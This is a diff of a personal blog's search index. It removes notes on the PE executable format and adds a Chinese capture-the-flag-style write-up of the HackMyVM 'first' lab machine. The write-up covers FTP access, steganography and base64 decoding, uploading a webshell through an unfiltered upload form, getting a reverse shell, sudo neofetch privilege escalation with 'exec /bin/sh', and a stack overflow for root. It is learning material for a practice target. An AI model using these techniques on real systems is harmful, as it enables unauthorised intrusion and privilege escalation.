@@ -22,29 +22,56 @@
       </tags>
   </entry>
   <entry>
-    <title></title>
-    <url>/2024/03/14/%E9%80%86%E5%90%91%E5%A4%8D%E4%B9%A0/</url>
-    <content><![CDATA[<h3 id="1-pe文件格式详解"><a href="#1-pe文件格式详解" class="headerlink" title="1.pe文件格式详解"></a>1.pe文件格式详解</h3><h4 id="1-头部"><a href="#1-头部" class="headerlink" title="1.头部"></a>1.头部</h4><h5 id="1-DOS头"><a href="#1-DOS头" class="headerlink" title="1.DOS头"></a>1.DOS头</h5><p>重要的是MZ头部（4D 5A），还有e_lfanew（指向PE头的其实位置）</p>
-<h5 id="2-PE头部IMAGE-NT-HEADER"><a href="#2-PE头部IMAGE-NT-HEADER" class="headerlink" title="2.PE头部IMAGE_NT_HEADER"></a>2.PE头部IMAGE_NT_HEADER</h5><p>50 45 00 00PE头部标识符</p>
-<h5 id="3-文件头IMAGE-FILE-HEADER"><a href="#3-文件头IMAGE-FILE-HEADER" class="headerlink" title="3.文件头IMAGE_FILE_HEADER"></a>3.文件头IMAGE_FILE_HEADER</h5><p>结构体固定大小20字节<br>起始位置取决于PE头的起始位置<br><img   src="https://cdn.nlark.com/yuque/0/2023/jpeg/40549096/1703746344858-ab831996-6bb6-479b-996f-60e03e4e5f5d.jpeg" ><br>节表个数在文件头里找到</p>
-<h5 id="4-可选头IMAGE-OPTIONAL-HEADER"><a href="#4-可选头IMAGE-OPTIONAL-HEADER" class="headerlink" title="4.可选头IMAGE_OPTIONAL_HEADER"></a>4.可选头IMAGE_OPTIONAL_HEADER</h5><p>结构体大小在文件头中已经决定好了<br>可选头是文件头的补充，主要用来管理PE文件被操作系统装载时所需要的信息<br><img   src="https://cdn.nlark.com/yuque/0/2023/jpeg/40549096/1703747021723-e4ccacc3-35b2-466e-8b2e-bea454421533.jpeg" ></p>
-<h5 id="5-节表详细IMAGE-SECTION-HEADER"><a href="#5-节表详细IMAGE-SECTION-HEADER" class="headerlink" title="5.节表详细IMAGE_SECTION_HEADER"></a>5.节表详细IMAGE_SECTION_HEADER</h5><p>节的个数以及在文件头中给出<br>每个结构体固定大小40字节<br><img   src="https://cdn.nlark.com/yuque/0/2023/jpeg/40549096/1703747416589-5e640e58-4a28-4bce-aa97-3f56eb1c66e7.jpeg" ></p>
-<h5 id="6-PE文件格式的三种地址"><a href="#6-PE文件格式的三种地址" class="headerlink" title="6.PE文件格式的三种地址"></a>6.PE文件格式的三种地址</h5><p>VA：虚拟地址，PE文件被win加载到<strong>内存</strong>后的地址<br>RVA：相对虚拟地址，VA相对于<strong>映射基地址（也就是ImageBase)<strong>的</strong>偏移地址</strong><br>FOA：文件偏移地址，相对于PE文件在磁盘文件开头的偏移地址，c32中看到的就是FOA<br>VA&#x3D;RVA+ImageBase<br>FOA和RVA，对齐值相同时是一样的<br>对齐值不同时<br>也就是 FOA&#x3D;该数据的RVA-该数据所在节的起始RVA+该数据所在节的起始FOA</p>
-<h4 id="2-数据目录相关内容"><a href="#2-数据目录相关内容" class="headerlink" title="2.数据目录相关内容"></a>2.数据目录相关内容</h4><h5 id="1-导入表"><a href="#1-导入表" class="headerlink" title="1.导入表"></a>1.导入表</h5><p>导入表结构体数据目录项的RVA和大小豆都被保存在<strong>可选头的数据目录</strong>中<br><img   src="https://cdn.nlark.com/yuque/0/2023/jpeg/40549096/1703748504562-384be541-7428-4154-aaab-edc6d1145428.jpeg" ><br>PE文件没被装载前，OFT和FT指向相同的内容，被装载后FT指向的地方<strong>保存导入函数的实际地址</strong><br>IMAGE_THUNK_DATA<br>Function，导入函数的序号<br>AddressofData，指向IMAGE_IMPORT_BY_NAME结构体的RVA，当最高位为1时才有效<br>IMAGE_IMPORT_BY_NAME<br>hint，导出函数表的索引号<br>Name，导入函数的名称</p>
-]]></content>
-  </entry>
-  <entry>
     <title>hackmyvm first 复盘</title>
     <url>/2024/03/15/new/index/</url>
     <content><![CDATA[<h4 id="基础信息"><a href="#基础信息" class="headerlink" title="基础信息"></a>基础信息</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">靶机ip 192.168.64.75</span><br><span class="line">攻击机ip 192.168.64.3</span><br></pre></td></tr></table></figure>
 
 <h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>扫描到3个端口，21端口，22端口和80端口</p>
-<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2020.08.29.png"   alt="d" style="zoom:50%;" >
+<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2020.08.29.png"   alt="d" style="zoom:40%;" >
 
+<p>80端口看不到什么内容</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.09.52.png" ></p>
+<p>nmap扫出来ftp端口有几个文件夹，登陆看看</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp 192.168.64.75</span><br></pre></td></tr></table></figure>
+
+<p>登陆账号密码都是ftp就行，看来看去只有first文件夹下面有个图片。下载出来</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.15.00.png" ></p>
+<p>接着就使用<strong>stegseek</strong>工具分析一下，自动分析出一个secret.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ stegseek first.jpg</span><br><span class="line">StegSeek 0.6 - https://github.com/RickdeJager/StegSeek</span><br><span class="line"></span><br><span class="line">[i] Found passphrase: &quot;firstgurl1&quot;</span><br><span class="line">[i] Original filename: &quot;secret.txt&quot;.</span><br><span class="line">[i] Extracting to &quot;first.jpg.out&quot;.</span><br><span class="line">the file &quot;first.jpg.out&quot; does already exist. overwrite ? (y/n)</span><br><span class="line">y</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ cat secret.txt</span><br><span class="line">SGkgSSBoYWQgdG8gY2hhbmdlIHRoZSBuYW1lIG9mIHRoZSB0b2RvIGxpc3QgYmVjb3VzZSBkaXJlY3RvcnkgYnVzdGluZyBpcyB0b28gZWFzeSB0aGVlc2UgZGF5cyBhbHNvIEkgZW5jb2RlZCB0aGlzIGluIGJlc2E2NCBiZWNvdXNlIGl0IGlzIGNvb2wgYnR3IHlvdXIgdG9kbyBsaXN0IGlzIDogMmYgNzQgMzAgNjQgMzAgNWYgNmMgMzEgNzMgNzQgNWYgNjYgMzAgNzIgNWYgNjYgMzEgNzIgMzUgNzQgZG8gaXQgcXVpY2sgd2UgYXJlIHZ1bG5hcmFibGUgZG8gdGhlIGZpcnN0IGZpcnN0IA==</span><br></pre></td></tr></table></figure>
+
+<p>secret.txt里面是串base64字符，解密一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ cat secret.txt| base64 -d</span><br><span class="line">Hi I had to change the name of the todo list becouse directory busting is too easy theese days also I encoded this in besa64 becouse it is cool btw your todo list is : 2f 74 30 64 30 5f 6c 31 73 74 5f 66 30 72 5f 66 31 72 35 74 do it quick we are vulnarable do the first first</span><br></pre></td></tr></table></figure>
+
+<p>注意看中间有一串十六机制数字，再解密一下，得到一个目录，访问一下</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.19.23.png" ></p>
+<h4 id="第一个shell"><a href="#第一个shell" class="headerlink" title="第一个shell"></a>第一个shell</h4><p>注意到第二点提到有upload.php，扫一下目录试试</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.19.57.png" ></p>
+<p>扫到一个uploads目录和一个upload.php</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.21.33.png" ></p>
+<p>可以发现文件上传没有任何过滤，那直接上传一个一句话木马</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.22.48.png" ></p>
+<p>蚁剑连接</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.27.44.png" ></p>
+<p>接下来我在目录上传一个后门php，kali开启监听，在蚁剑虚拟终端中用php，即可拿到www-data的shell</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.31.02.png" ></p>
+<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>sudo -l查到有neofetch可以利用，<a class="link"   href="https://gtfobins.github.io/%E5%9C%A8%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E6%9F%A5%E8%AF%A2%E5%88%B0%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F" >https://gtfobins.github.io/在这个网站查询到提权方式<i class="fas fa-external-link-alt"></i></a></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.39.02.png" ></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.38.30.png" ></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@first:/tmp$ echo &#x27;exec /bin/sh&#x27; &gt; a.sh</span><br><span class="line">echo &#x27;exec /bin/sh&#x27; &gt; a.sh</span><br><span class="line">www-data@first:/tmp$ ls</span><br><span class="line">ls</span><br><span class="line">a.sh</span><br><span class="line">www-data@first:/tmp$ sudo -u first neofetch --config a.sh</span><br><span class="line">sudo -u first neofetch --config a.sh</span><br><span class="line">$ id</span><br><span class="line">id</span><br><span class="line">uid=1000(first) gid=1000(first) groups=1000(first),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)</span><br></pre></td></tr></table></figure>
+
+<p>成功拿到first到shell</p>
+<p>再次sudo -l，发现有个secret，file查看发现是个二进制文件</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.43.22.png" ></p>
+<p>下载到本地用ida分析一下</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.45.15.png" ></p>
+<p>学习别的wp指导这里有个栈溢出（这块地方有待学习），输入超过10个字符串就会执行我们的command，<strong>思路就是sudo调用，然后给一个&#x2F;bin&#x2F;bash</strong>就拿到root到权限了</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.47.23.png" ></p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>图片隐写分析，提权命令利用，栈溢出的利用。</p>
 ]]></content>
       <tags>
         <tag>blog</tag>
         <tag>hackmyvm</tag>
+        <tag>学习</tag>
       </tags>
   </entry>
 </search>
